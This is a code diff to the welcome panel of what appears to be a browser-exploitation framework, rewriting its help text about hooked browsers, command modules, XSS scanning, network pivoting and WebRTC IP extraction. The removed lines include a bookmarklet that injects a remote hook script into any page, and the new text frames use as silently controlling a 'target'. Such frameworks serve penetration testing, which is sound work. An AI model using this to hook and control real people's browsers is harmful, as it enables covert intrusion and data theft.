@@ -10,46 +10,34 @@ WelcomeTab = function() {
     hook_url = Server::Core::Configuration.instance.hook_url
   %>
 
-    var bookmarklet = "javascript:%20(function%20()%20{%20var%20url%20=%20%27<%= hook_url %>%27;if%20(typeof%20server%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();"
 
     welcome = " \
               <div style='font:11px tahoma,arial,helvetica,sans-serif;width:500px' > \
-              <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Getting Started</span></p><br />\
-              <p>Welcome!</p><br /> \
-              <p>Before being able to fully explore the framework you will have to 'hook' a browser. To begin with you can point a browser towards the basic demo page <a href='/demos/basic.html' target='_blank'>here</a>, or the advanced version <a href='/demos/butcher/index.html' target='_blank'>here</a>.</p><br /> \
-              <p>If you want to hook ANY page (for debugging reasons of course), drag the following bookmarklet link into your browser's bookmark bar, then simply click the shortcut on another page: <a href='__BOOKMARKLETURL__'>Hook Me!</a></p><br /> \
-              <p>After a browser is hooked into the framework they will appear in the 'Hooked Browsers' panel on the left. Hooked browsers will appear in either an online or offline state, depending on how recently they have polled the framework.</p><br /> \
               <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Hooked Browsers</span></p><br />\
-              <p>To interact with a hooked browser simply left-click it, a new tab will appear. \
-              Each hooked browser tab has a number of sub-tabs, described below:</p><br /> \
-              <ul style=\"margin-left:15px;\"><li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Details:</span> Display information about the hooked browser after you've run some command modules.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Logs:</span> Displays recent log entries related to this particular hooked browser.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Commands:</span> This tab is where modules can be executed against the hooked browser. This is where most of the framework functionality resides. \
-              Most command modules consist of Javascript code that is executed against the selected\
-              Hooked Browser. Command modules are able to perform any actions that can be achieved\
-              through Javascript: for example they may gather information about the Hooked Browser, manipulate the DOM or perform other activities such as exploiting vulnerabilities within the local network of the Hooked Browser.<br /><br />\
-              Each command module has a traffic light icon, which is used to indicate the following:<ul>\
-              <li><img alt='' src='media/images/icons/green.png'  unselectable='on'> The command module works against the target and should be invisible to the user</li>\
-              <li><img alt='' src='media/images/icons/orange.png'  unselectable='on'> The command module works against the target, but may be visible to the user</li>\
-              <li><img alt='' src='media/images/icons/grey.png'  unselectable='on'> The command module is yet to be verified against this target</li>\
-              <li><img alt='' src='media/images/icons/red.png'  unselectable='on'> The command module does not work against this target</li></ul><br />\
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> The XssRays tab allows the user to check if links, forms and URI path of the page (where the browser is hooked) is vulnerable to XSS.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Proxy:</span> The Proxy tab allows you to submit arbitrary HTTP requests on behalf of the hooked browser. \
-              Each request sent by the Proxy is recorded in the History panel. Click a history item to view the HTTP headers and HTML source of the HTTP response.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Network:</span> The Network tab allows you to interact with hosts on the local network(s) of the hooked browser.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>WebRTC:</span> Send commands to the victims systems via a zombie specified as the primary WebRTC caller.</li> \
+              <p>Left-click any hooked browser to open its control tab. Each browser has the following sub-tabs available:</p><br /> \
+              <ul style=\"margin-left:15px;\"><li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Details:</span> Shows everything collected about the target — OS, browser version, plugins, cookies, screen size, timezone, and more.</li> \
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Logs:</span> A live log of all activity for this browser session.</li> \
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Commands:</span> The main control tab. Browse and execute modules against the hooked browser. \
+              Modules run as JavaScript inside the target browser and can collect data, manipulate the page, \
+              or pivot into the local network of the target.<br /><br />\
+              Module status is shown with a colour indicator:<ul>\
+              <li><img alt='' src='media/images/icons/green.png'  unselectable='on'> Works silently — target will not notice</li>\
+              <li><img alt='' src='media/images/icons/orange.png'  unselectable='on'> Works but may produce visible output to the target</li>\
+              <li><img alt='' src='media/images/icons/grey.png'  unselectable='on'> Not yet tested against this browser</li>\
+              <li><img alt='' src='media/images/icons/red.png'  unselectable='on'> Confirmed not working against this browser</li></ul><br />\
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> Automatically scans all links and forms on the hooked page for reflected XSS vulnerabilities.</li> \
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Network:</span> Discover and interact with hosts on the target's local network directly from this panel.</li> \
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>WebRTC:</span> Extract the target's real internal IP address and communicate peer-to-peer via WebRTC.</li> \
               </ul><br /> \
-              <p>You can also right-click a hooked browser to open a context-menu with additional functionality:</p><br /> \
+              <p>Right-clicking a hooked browser in the left panel gives additional options:</p><br /> \
               <ul style=\"margin-left:15px;\">\
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>Tunneling Proxy:</span> The Proxy allows you to use a hooked browser as a proxy. Simply right-click a browser from the Hooked Browsers tree to the left and select \"Use as Proxy\". \
-              The proxy runs on localhost port 6789 by default. Each request sent through the Proxy is recorded in the History panel in the Proxy tab. Click a history item to view the HTTP response headers and response body.</li> \
-              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> XssRays allows the user to check if links, forms and URI path of the page (where the browser is hooked) is vulnerable to XSS. To customize default settings of an XssRays scan, please use the XssRays tab.</li></ul><br /> \
-              <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Learn More</span></p><br />\
+              <li><span style='font:bold 11px tahoma,arial,helvetica,sans-serif'>XssRays:</span> Launch an XSS scan directly from the context menu. Fine-tune scan settings inside the XssRays tab.</li></ul><br /> \
+              <p><span style='font:bold 13px tahoma,arial,helvetica,sans-serif'>Notes</span></p><br />\
+              <p>To hook a target browser, direct them to the capture page: <a href='/demos/sample.html' target='_blank'>/demos/sample.html</a></p><br />\
               <br/>\
               </div>\
               ";
 
-  welcome = welcome.replace(/__BOOKMARKLETURL__/,bookmarklet);
 
   WelcomeTab.superclass.constructor.call(this, {
 	region:'center',
